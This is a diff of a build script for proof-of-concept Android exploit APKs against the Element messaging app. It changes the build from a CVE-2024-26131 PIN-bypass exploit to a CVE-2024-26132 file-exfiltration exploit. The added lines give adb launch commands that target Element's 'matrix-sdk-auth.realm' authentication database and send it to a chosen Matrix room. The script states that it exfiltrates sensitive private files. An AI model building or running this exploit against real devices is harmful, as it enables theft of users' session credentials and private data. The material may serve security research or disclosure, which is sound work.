@@ -19,36 +19,26 @@ OUT_DIR="$SCRIPT_DIR/dist"
 BUILD_DIR="$SCRIPT_DIR/build"
 CLASSES_DIR="$BUILD_DIR/classes"
 DEX_DIR="$BUILD_DIR/dex"
-APK_UNALIGNED="$OUT_DIR/element-exploit-unaligned.apk"
-APK_ALIGNED="$OUT_DIR/element-exploit-aligned.apk"
-APK_SIGNED="$OUT_DIR/element-exploit.apk"
+APK_UNALIGNED="$OUT_DIR/element-exfiltrate-unaligned.apk"
+APK_ALIGNED="$OUT_DIR/element-exfiltrate-aligned.apk"
+APK_SIGNED="$OUT_DIR/element-exfiltrate.apk"
 
 rm -rf "$BUILD_DIR" "$OUT_DIR"
 mkdir -p "$CLASSES_DIR" "$DEX_DIR" "$OUT_DIR"
 
-echo "🔨 Building CVE-2024-26131 Element Android Exploit APK..."
+echo "🔨 Building CVE-2024-26132 Element Android File Exfiltration APK..."
 
 echo "📝 Compiling Java sources..."
 javac -source 8 -target 8 \
   -cp "$ANDROID_JAR" \
   -d "$CLASSES_DIR" \
-  "$SCRIPT_DIR/src/com/example/elementexploit/MainActivity.java" \
-  "$SCRIPT_DIR/src/im/vector/app/features/pin/PinMode.java" \
-  "$SCRIPT_DIR/src/im/vector/app/features/pin/PinArgs.java" \
-  "$SCRIPT_DIR/src/im/vector/app/features/webview/WebViewMode.java" \
-  "$SCRIPT_DIR/src/im/vector/app/features/login/LoginConfig.java"
+  "$SCRIPT_DIR/src/com/example/elementexfiltrate/MainActivity.java"
 
 echo "🔄 Creating DEX..."
 "$D8" --min-api 21 \
   --lib "$ANDROID_JAR" \
   --output "$DEX_DIR" \
-  "$CLASSES_DIR/com/example/elementexploit/MainActivity.class" \
-  "$CLASSES_DIR/im/vector/app/features/pin/PinMode.class" \
-  "$CLASSES_DIR/im/vector/app/features/pin/PinArgs.class" \
-  "$CLASSES_DIR/im/vector/app/features/pin/PinArgs\$1.class" \
-  "$CLASSES_DIR/im/vector/app/features/webview/WebViewMode.class" \
-  "$CLASSES_DIR/im/vector/app/features/login/LoginConfig.class" \
-  "$CLASSES_DIR/im/vector/app/features/login/LoginConfig\$1.class"
+  "$CLASSES_DIR/com/example/elementexfiltrate/MainActivity.class"
 
 echo "📦 Packaging APK..."
 "$AAPT" package -f \
@@ -80,13 +70,14 @@ fi
   --out "$APK_SIGNED" "$APK_ALIGNED"
 
 echo ""
-echo "🚨 CVE-2024-26131 Element Android Exploit APK Built Successfully!"
-echo "====================================================================="
+echo "🚨 CVE-2024-26132 Element Android File Exfiltration APK Built Successfully!"
+echo "=========================================================================="
 echo "📍 APK Location: $APK_SIGNED"
 echo ""
 echo "🎯 To install and test:"
 echo "   adb install '$APK_SIGNED'"
-echo "   # Launch 'Element Exploit' app"
-echo "   # Tap '🚨 EXPLOIT PIN BYPASS' button"
+echo "   adb shell am start -n com.example.elementexfiltrate/.MainActivity \\"
+echo "     --es target_file 'matrix-sdk-auth.realm' \\"
+echo "     --es room_id '!your-room-id:server'"
 echo ""
-echo "💡 Expected result: Element opens PIN modification without asking for current PIN"
+echo "💡 Expected result: Sensitive files from Element's private storage exfiltrated to Matrix room"
